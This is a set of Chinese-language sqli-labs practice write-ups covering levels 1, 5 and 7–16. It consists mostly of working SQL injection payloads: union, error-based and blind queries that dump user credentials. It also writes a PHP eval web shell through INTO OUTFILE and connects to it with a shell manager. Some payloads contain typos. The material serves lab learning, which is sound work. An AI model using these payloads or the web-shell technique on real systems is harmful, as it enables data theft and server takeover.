sqli-lab-11~16的wp

sqli-lab-11~16

  • 使用sqli-lab靶场

这是关于11~16关的简单讲解

11~16关实际上使用的指令和1~10关基本一样
只不过是将注入的地方切换到输入框或者bp之中
这边只使用第11题的完整过程

第十一题
打开靶场，发现页面出现的是账号密码登入界面,可以知道注入方式应该为post型
打开bp，抓包,将请求包发送到重发器之中:

然后在username后面构造:
-1' 确定闭合方式

接下来就是老步骤了:
-1' or 1=1 --+确定显示方式

-1' union select 1,datebase() --+获取数据库名称

不过中间有点小插曲-1' union select 1,datebase() limit 1,1--+开始会没有回显

于是直接使用
-1' union select 1,group_concat(schema_name) from information_schema.schemata --+来获取全部的数据库名称

-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security' --+来获取表名

-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'--+
来获取列名

最后使用-1' union select 1,group_concat(username,0x7c,password) from security.users --+来脱库获取数据




第12题就是将' 改为")
即-1") union select 1,group_concat(username,0x7c,password) from security.users --+



第13题是无回显,使用updatemxl报错注入即可
最后的payload为:
1') and updatexml(1,concat(0x7c,(select group_concat(username,0x7c,password) from security.users),0x7c),1) --


第14题和13题差不多,将')改为"
1" and updatexml(1,concat(0x7c,(select group_concat(username,0x7c,password) from security.users),0x7c),1) --


第15，16题分别是布尔盲注和时间盲注，和之前一样使用自动化脚本跑

总结下来就是下表

关卡 闭合符号 注入类型 核心特点
Less11 ' 联合查询 / 报错注入 POST 表单登录框，有回显
Less12 ") 联合查询 / 报错注入 双引号 + 括号闭合
Less13 ') 报错注入 单引号 + 括号，仅报错回显，无数据回显
Less14 " 报错注入 双引号闭合报错注入
Less15 ' 布尔 / 时间盲注 页面无报错，只有登录成功 / 失败两种状态
Less16 ") 布尔 / 时间盲注 双引号 + 括号闭合盲注




上面主要是使用bp的操作
其实直接在网页的输入框里面也可以进行注入:

但是需要注意的是:
输入框里面应该是不识别 --+ 里面的 +
如果你不在--后面输入空格，语法会不对,所以需要将--+修改为-- (最后有一个空格)






对比一下get型和post型的源代码区别:
POST:
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
GET:
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
主要就是注入入口由id后面变成username后面

这是我完成第八,九,十题的wp

第八第九第十这三题命令都差不多，截图主要用第八题的
第九题和第十题十时间盲注，截图看不出来区别,这边只做命令讲解，不附带截图了

第八题:
打开靶场:
构造?id=1',页面报错，确定注入入口

然后我尝试了
?id=1' and 1=1 --+
页面输出 You are in → 闭合成功
?id=1' and 1=2 --+
页面空白，1=2 是假条件，页面变化，确认布尔盲注。


接下来去猜测库名:
构造:?id=1' and length(database())=8 --+
如果页面出现 You are in → 条件成立，库名长度 = 8（security 正好 8 个字符！）
如果页面空白 → 长度不是 8，换数字试


接下里逐个字符猜测库名:
构造:?id=1' and ascii(substr(database(),1,1))=115 --+
通过修改database后面的1和ASCLL码来猜测库名

接下来通过构造:
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101 --+
猜测表名（security库内的）
构造:
?id=1' and ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))=117 --+
猜测列名(users表内的)
最后构造:
?id=1' and ascii(substr((select username from security.users limit 0,1),1,1))=68 --+
猜测账号密码数据



最终得出数据库内容

手动注入效率实在是太低了，于是我是用AI工具写了一个自动化程序来注入:

第九题:

?id=1' and sleep(5) --+
访问观察：页面加载卡住 5 秒左右才返回，说明注入闭合成功，sleep 能执行。
对比假条件测试（不会延时）
?id=1' and 1=2 and sleep(5) --+
1=2条件为假，if 不会执行 sleep，页面瞬间加载完成。

然后基本步骤就和第八题一样了:
?id=1' and if( length(database())=8 , sleep(3), 1 ) --+
->猜测库名

?id=1' and if( ascii(substr(database(),1,1))=115 , sleep(3), 1 ) --+
->猜测表名

?id=1' and if( ascii(substr( (select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1 ))=101 , sleep(3),1 ) --+
->猜测列名

?id=1' and if( ascii(substr( (select username from security.users limit 0,1),1,1 ))=68 , sleep(3),1 ) --+
->猜测账号密码

这里也推荐使用自动化程序来注入，手动注入看个现象就好了



第十题
其实和第九题一模一样:
只需要将'替换为双引号就好

这是我完成第七题的wp


第七题

打开靶场，依旧测试?id=1
发现有use outfile这样一句话,查询资料后,猜测可能是文件写入型 SQL 注入

先尝试构造闭合，尝试几个常见的闭合后，发现闭合为'))
查询源代码，发现有这样一段代码:
$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
可以看到id是被((''))所包裹，所以我的猜测是正确的

接下来构造?id=1')) and 1=2 --+,
发现报错返回还是一样的:

基本就可以确定是 文件写入型 SQL 注入
于是可以构造:
?id=1')) union select 1,'<?php @eval($_POST[cmd]);?>',3 into outfile "D:\\\\ziliao111\\\\sql\\\\sqli-labs-master\\\\shell.php"%20--+
最后那个路径要依据自己的小p中，靶场的根目录来修改

这时候发现文件夹里面并没有成功写入shell.php这个文件,这个就是这一题可能彩的第一个坑:没有给用户写入文件的权限:
首先右击这一关的文件夹,选择属性 ->安全->编辑,然后选择users,将下面的修改，写入等权限勾上，然后确定确定，这时候在尝试一遍上面的URL，发现就可以生成php文件了

成功生成php文件后,访问http://test:8088/Less-7/shell.php/
(还是要根据自己靶场的位置和生成的php文件名称决定)
可能会出现这样的页面:

1 Dump Dump 3
这个是id=1的用户的账号密码，但是一句话木马并没有执行
这里就是这一题第二个坑:前面id=1成立，查询的记录会一并写入文件
也就是 users 表里面那行 1,Dumb,Dumb 被写到 shell.php 里面，把 php 代码覆盖 / 挤到后面，甚至直接丢失
所以要将id=1修改为不成立的条件:例如id=-10
这是后再访问，发现只有1,3了

木马成功执行后，打开连接工具(蚁剑，哥斯拉),将URL粘贴进去，密码为:cmd
然后连接添加，就成功利用漏洞登入数据库

除了我wp中提到的两个坑外，还可能存在一些其他的问题:

404 Not Found（物理路径和 Web 根目录不匹配）

现象：文件成功写到磁盘，浏览器访问 404
原因：写入的绝对路径不属于网站 Web 根目录，Apache 无法解析访问。
解决：写文件的路径必须和网站根目录一致。

第五题:

首先打开靶场，发现依旧是叫我输入id
于是构造?id=1

发现这次不能直接显示账号密码了，猜测应该是无数据回显
这时候应该使用updatexml报错回显
接下来依旧是先构造闭合，现尝试:?id=1'

报sql错误:
''1''LIMIT 0,1'
可以发现报错的地方在1'
基本可以确定输入形式为:'id'
然后构造:
?id=1' and updatexml(1,concat(0x7c,database(),0x7c),1)--+
去拿数据库名称

也可以构造
?id=1' and updatexml(1,concat(0x7c,(select group_concat(schema_name) from information_schema.schemata),0x7c),1)--+
一口气拿到所有的数据库名称，但是updatexml的回显只有32位,如果数据库名称太多，可能显示不全
这边还是推荐使用
?id=1' and updatexml(1,concat(0x7c,(select concat(schema_name) from information_schema.schemata limit0,1),0x7c),1)--+
通过改变0一个一个去寻找

得到数据库名称后
接着构造:
?id=1' and updatexml(1,concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7c),1--+
来拿到security中所有的表名

得到表名之后就是在users中寻找账号密码:
构造:
?id=1' and updatexml(1,concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name=''users),0x7c),1--+

最后就是脱库
构造:
?id=1' and updatexml(1,concat(0x7c,(select group_concat(username,0x7c,password) from users),0x7c),1)--+

发现显示不全，这就是上面提到的数据太多，显示不全
所以建议这样:
?id=1' and updatexml(1,concat(0x7c,(select concat(username,0x7c,password) from users limit 0,1),0x7c),1)--+
通过修改0一个一个去查找

这是我完成第一题的wp:


首先打开靶场,发现页面有提示，要去我们输入ID

初步猜想是get型的，尝试在地址栏补充"?id=1"

发现页面出现登入账号和密码，修改id后面的数字，可以拿到不同的账号密码
但是我希望能进一步了解这个靶场，先测试sql注入入口
构造"?id=1'"

页面报sql语法错误，确定注入点
补充一下，除了上面修改id后面的数字以外，还可以构造
?id=1' and 1=1 --+
?id=1' and 1=2 --+

比较两个页面的不同来确定注入点
接下来用order by 判断查询有多少列

  • order by 1：按第 1 列排序，正常页面，代表存在第 1 列
  • order by 2：正常，存在第 2 列
  • order by 3：正常，存在第 3 列
  • order by 4：页面报错 → 最多只有 3 列

接下来查询数据库名称
构造:?id=-1' union select 11,database(),33--+

这样就可以得到一个数据库名称：security
如果还想查其他的名称，可以用limit:
例如:?id=-1' union select 11,database(),33 limit 0,1 --+
修改'0'即可查询其他的名称
其实还可以一口气查出全部：
?id=-1' union select 11,group_concat(schema_name),33 from information_schema.schemata--+

顺便提醒一下：如果?id=1而不是?id=-1的话，就会出现查询结果显示在页面的情况
大概是因为前面的语句先实现了，优先显示，所以导致我们后面构造的sql语句执行了也不显示

得到名称查询 security 库下面所有表名
构造:?id=-1' union select 11,group_concat(table_name),33 from information_schema.tables where table_schema='security'--+

可以得到users，我要找的账号密码信息应该就在其中

接下里查询 users 表里面全部字段（列名）
构造:?id=-1' union select 11,group_concat(column_name),33 from information_schema.columns where table_schema='security' and table_name='users'--+

得到：id 编号、username 账号、password 密码

最后就是脱库
构造:?id=-1' union select group_concat(username,0x7c,password),3 from security.users --+

这样就成功拿到账号密码了

但是账号密码太多了，可以构造:
?id=-1' union select concat(username,password),3 from security.users limit 0,1 --+
依旧是修改'0'这样就可以慢慢找出全部的账号密码了:

从这个靶场中可以学到sql注入数据库的全过程，接下俩就要学怎么绕过了
